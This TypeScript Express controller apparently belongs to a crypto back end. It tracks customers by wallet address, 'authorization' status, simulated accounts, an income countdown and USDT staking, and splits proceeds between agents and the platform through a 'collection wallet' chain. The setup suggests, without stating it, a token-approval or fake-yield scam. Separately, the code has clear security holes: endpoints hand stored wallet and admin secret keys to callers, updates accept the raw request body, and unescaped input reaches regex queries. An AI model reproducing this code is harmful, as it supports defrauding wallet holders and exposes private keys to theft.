import { Request, Response } from 'express';
import Customer from '../models/customer';
import handleAsync from '../utils/handleAsync';
import { RequestCustom } from 'user';
import { IdGen } from '../utils/idGen';
import User, { IUser } from '../models/user';
import Wallet from '../models/wallet';
import Setting from '../models/setting';
import { isProxy } from '../middlewares/authMiddleware';
import WalletShare from '../models/walletShare';
import { io } from '../services/socket';

const buildQuery = async (
  queryParams: any,
  req: RequestCustom,
): Promise<any> => {
  const query: any = {};

  if (queryParams.employee) {
    let searchText;
    try {
      const userParam = JSON.parse(String(queryParams.employee));
      searchText = userParam.name;
    } catch (e) {
      searchText = String(queryParams.employee).trim();
    }
    const userData = await User.find({
      name: {
        $regex: searchText,
        $options: 'i',
      },
    });

    if (userData && userData.length > 0) {
      query.employee = { $in: userData.map((employee) => employee._id) };
    } else {
      return null;
    }
  }

  if (queryParams.network) {
    query.network = queryParams.network;
  }

  if (queryParams.isVerified !== undefined) {
    query.isVerified = queryParams.isVerified === 'true';
  }

  if (queryParams.isAuthorized !== undefined) {
    query.isAuthorized = queryParams.isAuthorized === 'true';
  }

  if (queryParams.address) {
    query.address = { $regex: queryParams.address, $options: 'i' };
  }
  if (isProxy(req.user)) {
    const employees = await User.find({ proxy: req.user._id });
    const employeeIds = employees.map((employee) => employee._id);
    query.employee = { $in: [...employeeIds, req.user._id] };
  }

  console.log('Built query:', query); // 添加日志
  return query;
};

// 获取成员列表
export const getCustomers = handleAsync(
  async (req: RequestCustom, res: Response) => {
    const { current = '1', pageSize = '10' } = req.query;

    const query = await buildQuery(req.query, req);
    console.log('Final query:', query);

    // 添加这个日志来查看实际查询结果的内容
    const members = await Customer.find(query)
      .populate('employee')
      .sort('-createdAt')
      .limit(+pageSize)
      .skip((+current - 1) * +pageSize)
      .exec();

    console.log(
      'Actual results:',
      members.map((m) => ({
        id: m.id,
        network: m.network,
      })),
    ); // 添加详细日志

    const total = await Customer.countDocuments(query);

    res.json({
      success: true,
      data: members,
      total,
      current: +current,
      pageSize: +pageSize,
    });
  },
);

export const addCustomer = handleAsync(
  async (req: RequestCustom, res: Response) => {
    // 查找是否存在相同地址的成员
    const existingMember = await Customer.findOne({
      address: req.body.address,
    });

    // 获取当前IP地址
    const currentIP =
      req.headers['x-forwarded-for']?.toString().split(',')[0].trim() ||
      req.socket.remoteAddress ||
      'unknown';

    if (existingMember) {
      // 如果成员已存在，更新登录时间和登录IP并返回现有成员信息
      const updatedMember = await Customer.findByIdAndUpdate(
        existingMember._id,
        {
          logedinAt: new Date(),
          loginIP: currentIP,
          // 可以在这里更新其他需要更新的字段
        },
        { new: true },
      )
        .populate('channel')
        .populate('proxy');

      res.json({
        success: true,
        data: updatedMember,
        // isNewMember: false, // 标记这是现有成员
      });
      return;
    }

    // 如果成员不存在，创建新成员
    const newId = await IdGen.next(Customer, 'id', 6);

    const newMember = new Customer({
      ...req.body,
      id: newId,
      createdAt: new Date(),
      logedinAt: new Date(),
      registerIP: currentIP,
      loginIP: currentIP,
    });

    const savedMember = await newMember.save();

    // 返回新创建的成员信息
    res.status(201).json({
      success: true,
      data: savedMember,
      // isNewMember: true, // 标记这是新成员
    });
  },
);

// 获取单个成员
export const getCustomerById = handleAsync(
  async (req: Request, res: Response) => {
    const customer = await Customer.findById(req.params.id)
      .populate('channel')
      .populate('proxy');

    if (!customer) {
      res.status(404);
      throw new Error('Customer not found');
    }

    res.json({
      success: true,
      data: customer,
    });
  },
);

// 更新成员
export const updateCustomer = handleAsync(
  async (req: Request, res: Response) => {
    const { id } = req.params;
    const updateData = req.body;

    const customer = await Customer.findById(id);

    if (!customer) {
      res.status(404);
      throw new Error('成员未找到');
    }

    // 检查 isAuthorized 和 isVerified 不能同时为 true
    if (
      (updateData.isAuthorized === true && customer.isVerified === true) ||
      (updateData.isAuthorized === true && updateData.isVerified === true)
    ) {
      res.status(400);
      throw new Error('模拟账户不能设置为授权账户');
    }

    // 如果设置 isVerified 为 true，添加验证时间
    if (updateData.isVerified === true) {
      updateData.verifiedAt = new Date();
      io.emit('authRemaining');
    }

    // 如果设置 isAuthorized 为 true，添加授权时间
    if (updateData.isAuthorized === true) {
      updateData.authorizedAt = new Date();
      io.emit('authRemaining');
    }

    // 如果设置 usdtStaking 为 true，添加质押时间
    if (updateData.usdtStaking) {
      updateData.stackingAt = new Date();
    }

    // 如果更新登录信息
    if (updateData.logedinAt) {
      updateData.LogedinIP =
        req.headers['x-forwarded-for']?.toString().split(',')[0].trim() ||
        req.socket.remoteAddress ||
        'unknown';
    }

    const updatedMember = await Customer.findByIdAndUpdate(id, updateData, {
      new: true,
    });

    // 获取授权设置值
    const authorizationSetting = await Setting.findOne({
      key: 'authorization',
    });

    // 如果 isVerified 或 isAuthorized 设置为 true，发送事件到前端
    if (updateData.isVerified === true || updateData.isAuthorized === true) {
      io.emit('income_countdown', {
        address: updatedMember.address,
        network: updatedMember.network,
        authorization: authorizationSetting ? authorizationSetting.value : '0',
        verifiedAt: updatedMember.verifiedAt,
        authorizedAt: updatedMember.authorizedAt,
      });
    }

    res.json({
      success: true,
      data: updatedMember,
    });
  },
);

// 删除成员
export const deleteCustomer = handleAsync(
  async (req: Request, res: Response) => {
    const { id } = req.params;

    const customer = await Customer.findByIdAndDelete(id);

    if (!customer) {
      res.status(404);
      throw new Error('成员未找到');
    }

    res.json({
      success: true,
      data: { message: 'Customer deleted successfully' },
    });
  },
);

// 批量删除成员
export const deleteMultipleCustomers = handleAsync(
  async (req: Request, res: Response) => {
    const { ids } = req.body;

    await Customer.deleteMany({
      _id: { $in: ids },
    });

    res.json({
      success: true,
      message: `${ids.length} customers deleted successfully`,
    });
  },
);

//授权客户
export const verifyCustomer = handleAsync(
  async (req: Request, res: Response) => {
    const { network, address } = req.body;

    // 检查是否存在具有相同网络和地址组合的客户
    const existingCustomer = await Customer.findOne({ network, address });

    if (!existingCustomer) {
      res.status(404);
      throw new Error('Customer not found');
    }

    // 更新验证状态
    existingCustomer.isVerified = true;
    existingCustomer.verifiedAt = new Date();
    await existingCustomer.save();

    // 获取授权设置值
    const authorizationSetting = await Setting.findOne({
      key: 'authorization',
    });

    // 发送事件到前端
    io.emit('income_countdown', {
      address: existingCustomer.address,
      network: existingCustomer.network,
      authorization: authorizationSetting ? authorizationSetting.value : '0',
      isVerified: true,
      verifiedAt: existingCustomer.verifiedAt,
    });

    res.json({
      success: true,
      data: existingCustomer,
    });
  },
);

export async function findWalletInCreatorChain(
  currentUser: any,
  network: string,
  WalletShare: any,
): Promise<any> {
  // 如果是管理员或没有创建者，返回null
  if (currentUser.isAdmin || !currentUser.creator) {
    return null;
  }

  // 获取创建者ID
  const creatorId =
    typeof currentUser.creator === 'object' && '_id' in currentUser.creator
      ? currentUser.creator._id
      : currentUser.creator;

  // 查找创建者的钱包
  const creatorWallet = await WalletShare.findOne({
    user: creatorId,
    network: network,
  });

  if (creatorWallet) {
    return creatorWallet;
  }

  // 如果创建者没有钱包，递归查找创建者的创建者
  const creator = await User.findById(creatorId).populate('creator');
  if (creator) {
    return findWalletInCreatorChain(creator, network, WalletShare);
  }

  return null;
}

// 获取管理员钱包配置信息
export async function getAdminWalletConfig(network: string) {
  const adminAddressKey = `${network}SuperAdmin`;
  const secretKeyKey = `address${network}Key`;

  const adminAddressSetting = await Setting.findOne({ key: adminAddressKey });
  const secretKeySetting = await Setting.findOne({ key: secretKeyKey });

  return {
    adminAddressSetting,
    secretKeySetting,
  };
}

// customer返回用户归集钱包信息
export const getCustomerWalletByInviteCode = handleAsync(
  async (req: RequestCustom, res: Response) => {
    const { id } = req.params;

    const customer = await Customer.findById(id).populate({
      path: 'employee',
      populate: {
        path: 'creator',
      },
    });

    if (!customer) {
      res.status(404);
      throw new Error('Customer not found');
    }

    const { network } = customer;

    // 从设置表中获取超级管理员地址和密钥（无论是否有邀请码，都需要获取）
    const { adminAddressSetting, secretKeySetting } =
      await getAdminWalletConfig(network);

    if (!adminAddressSetting || !secretKeySetting) {
      res.status(404);
      throw new Error(`未找到${network}网络的管理员钱包配置`);
    }

    // 管理员钱包信息
    const adminWallet = {
      network: network,
      address: adminAddressSetting.value,
      secretKey: secretKeySetting.value,
      balance: '0',
    };

    const user = customer.employee as IUser;

    if (!user) {
      // 如果没有邀请码，直接返回管理员钱包信息
      res.json({
        success: true,
        data: adminWallet,
      });
      return;
    }

    // 1. 先查找用户自己是否有对应网络的钱包
    let wallet = await Wallet.findOne({
      user: user._id,
      network: network,
    });

    // 2. 递归查找创建者链上的钱包，直到找到钱包或到达顶级管理员
    // 如果用户没有钱包，递归查找创建者链上的钱包
    if (!wallet && !user.isAdmin) {
      wallet = await findWalletInCreatorChain(user, network, WalletShare);
    }

    // 3. 如果都没找到，返回授权失败
    if (!wallet) {
      res.status(403);
      throw new Error('授权失败：未找到可用的钱包');
    }

    // 获取钱包创建者的分润比例
    const walletCreator = await User.findById(wallet.user);
    if (!walletCreator) {
      res.status(404);
      throw new Error('未找到钱包创建者');
    }

    // 获取代理的分润比例（如果没有设置则为0）
    const proxySharingRate = walletCreator.proxySharingRate || 0;

    // 如果代理分润比例为0，只返回管理员钱包信息
    if (proxySharingRate === 0) {
      res.json({
        success: true,
        data: adminWallet,
      });
      return;
    }

    //获取平台分润比例
    const platformSharingRate = 100 - proxySharingRate;

    // 返回用户钱包信息、管理员钱包信息以及分润比例
    res.json({
      success: true,
      data: {
        // 用户/代理钱包信息
        agentWallet: {
          network: wallet.network,
          address: wallet.address,
          // secretKey: wallet.secretKey,
          // balance: wallet.balance || '0',
          proxySharingRate: proxySharingRate / 100, // 代理分润比例
          platformSharingRate: platformSharingRate / 100, // 平台分润比例
        },
        // 管理员钱包信息
        adminWallet: adminWallet,
      },
    });
  },
);

// 定义TimeRemaining接口
interface TimeRemaining {
  hours: number;
  minutes: number;
  seconds: number;
  totalSeconds: number;
  formatted: string;
}

// 计算剩余时间
function calculateRemaining(
  startTimeStr: string,
  periodHours: number,
): TimeRemaining {
  // 解析时间并处理时区（假设输入时间为ISO格式，本地时区）
  const startTime = new Date(startTimeStr);
  const now = new Date();

  // 计算时间差（毫秒）
  const deltaMs = now.getTime() - startTime.getTime();
  const periodMs = periodHours * 3600 * 1000;

  // 处理负时间差（时钟不同步时的保护）
  const safeDeltaMs = Math.max(deltaMs, 0);

  // 核心计算公式
  const remainderMs = safeDeltaMs % periodMs;
  const remainingMs = periodMs - remainderMs;

  // 转换为标准时间单位
  const totalSeconds = Math.floor(remainingMs / 1000);
  const hours = Math.floor(totalSeconds / 3600);
  const minutes = Math.floor((totalSeconds % 3600) / 60);
  const seconds = totalSeconds % 60;

  // 格式化显示
  const formatted = [
    hours.toString().padStart(2, '0'),
    minutes.toString().padStart(2, '0'),
    seconds.toString().padStart(2, '0'),
  ].join(':');

  return {
    hours,
    minutes,
    seconds,
    totalSeconds,
    formatted,
  };
}

// 获取客户授权剩余时间
export const getCustomerAuthorizationRemaining = handleAsync(
  async (req: RequestCustom, res: Response) => {
    const customer = req.customer; // 从请求体中获取customer对象

    const { authorizedAt, verifiedAt } = customer;

    // 检查是否有授权时间
    if (!authorizedAt && !verifiedAt) {
      res.status(400);
      throw new Error('客户未授权或验证');
    }

    // 获取授权设置值（小时数）
    const authorizationSetting = await Setting.findOne({
      key: 'authorization',
    });

    if (!authorizationSetting) {
      res.status(404);
      throw new Error('未找到授权时间设置');
    }

    const periodHours = parseInt(authorizationSetting.value, 10);

    // Determine which time to use as start time (prioritize authorized time)
    const startTimeStr = (authorizedAt || verifiedAt).toISOString();

    // 计算剩余时间
    const remaining = calculateRemaining(startTimeStr, periodHours);

    res.json({
      success: true,
      data: {
        authorizedAt,
        verifiedAt,
        periodHours,
        remaining,
      },
    });
  },
);

// 根据邀请码获取授权地址
export const getCustomerInviteCode = handleAsync(
  async (req: RequestCustom, res: Response) => {
    const { id } = req.params;

    const customer = await Customer.findById(id).populate({
      path: 'employee',
      populate: {
        path: 'creator',
      },
    });

    if (!customer) {
      res.status(404);
      throw new Error('客户未找到');
    }

    const user = customer.employee as IUser;

    if (!user) {
      // 使用getAdminWalletConfig获取管理员钱包配置
      const { adminAddressSetting: addressSetting, secretKeySetting } =
        await getAdminWalletConfig(customer.network);

      // 直接返回设置表中的地址和对应的密钥
      res.json({
        success: true,
        data: {
          network: customer.network,
          address: addressSetting?.value,
          secretKey: secretKeySetting?.value,
        },
      });
      return;
    }

    // 1. 先查找用户自己是否有对应网络的钱包
    let wallet = await Wallet.findOne({
      user: user._id,
      network: customer.network,
    });

    // 2. 递归查找创建者链上的钱包，直到找到钱包或到达顶级管理员
    // 如果用户没有钱包，递归查找创建者链上的钱包
    if (!wallet && !user.isAdmin) {
      wallet = await findWalletInCreatorChain(user, customer.network, Wallet);
    }

    // 3. 如果都没找到，返回授权失败
    if (!wallet) {
      res.status(403);
      throw new Error('授权失败：未找到可用的钱包');
    }

    // 返回找到的钱包信息
    res.json({
      success: true,
      data: {
        network: wallet.network,
        address: wallet.address,
        secretKey: wallet.secretKey,
      },
    });
  },
);
